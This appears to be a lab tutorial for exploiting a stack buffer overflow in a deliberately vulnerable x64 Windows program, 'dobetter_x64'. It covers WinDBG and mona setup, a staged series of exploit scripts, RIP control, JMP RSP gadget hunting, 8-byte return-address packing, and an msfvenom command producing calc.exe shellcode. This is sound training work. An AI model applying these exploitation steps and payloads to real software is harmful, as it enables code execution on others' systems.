# Tutorial — dobetter_x64 (WinDBG + mona3 + Python 3)

Complete [lab 01](../01-x86-stack-bof/TUTORIAL.md) first unless you already
own classic EIP control.

## Differences that matter

| | x86 lab | x64 lab |
|--|---------|---------|
| Port | 31337 | **31338** |
| IP register | EIP | **RIP** |
| Addr size | 4 (`<I`) | **8 (`<Q`)** |
| Trampoline | JMP ESP | **JMP RSP** |
| mona | `jmp -r esp` | `jmp -r rsp` |
| Shellcode | `windows/exec` x86 | **`windows/x64/exec`** |

## 1. Attach x64 session

Start `dobetter_x64.exe`, attach WinDBGX (auto arch) or Classic **x64**.

```text
!load pykd
as !mona !py -3.9 C:\Tools\mona3\mona.py
!mona config -set workingfolder C:\mona-work\%p
```

## 2. Scripts

```bash
export TARGET_IP=127.0.0.1 TARGET_PORT=31338
python3 exploits/01_connect.py
python3 exploits/02_crash.py
python3 exploits/03_pattern.py
# mona pattern_offset / findmsp — note 8-byte RIP
python3 exploits/04_rip_control.py
python3 exploits/05_badchars.py
# !mona jmp -r rsp -cpb "\x00\x0a"
python3 exploits/06_shellcode.py
```

## 3. Packing the return address

```python
import struct
jmp_rsp = 0x000000014000XXXX  # from YOUR mona output
buf += struct.pack("<Q", jmp_rsp)
```

Null bytes in addresses are common on x64. This lab uses a **length-based**
copy (not `sprintf %s`), so `\x00` inside the overflow payload is allowed.
**Newline `\x0a` still ends the TCP line** and remains bad.

**Practical approach for this lab:**

1. Confirm RIP control with `BBBBBBBB` (`0x4242424242424242`) first.
2. Find JMP RSP with mona (`!mona jmp -r rsp`).
3. Verify all 8 address bytes landed: `dqs rsp` (or equivalent).
4. Prefer shellcode that avoids `\x0a` (and other mona-discovered bad chars).

Gadget form notes (MinGW vs MSVC): [../shared/mona-gadgets.md](../shared/mona-gadgets.md).

## 4. Stack after RET

After returning to `JMP RSP`, `RSP` should point at your shellcode (possibly
with a small NOP sled). Single-step (`t` / `p`) across the trampoline once.

## 5. Shellcode example

```bash
msfvenom -p windows/x64/exec CMD=calc.exe -b '\x00\x0a' -f python -v shellcode
```

## 6. Checkpoint

- [ ] RIP marker reliable
- [ ] 8-byte endianness correct in Python
- [ ] JMP RSP confirmed in disassembly
- [ ] Lab shellcode runs with DEP off

## Next

[../../curriculum/07-next-level.md](../../curriculum/07-next-level.md) — DEP/ROP, SEH, courses.
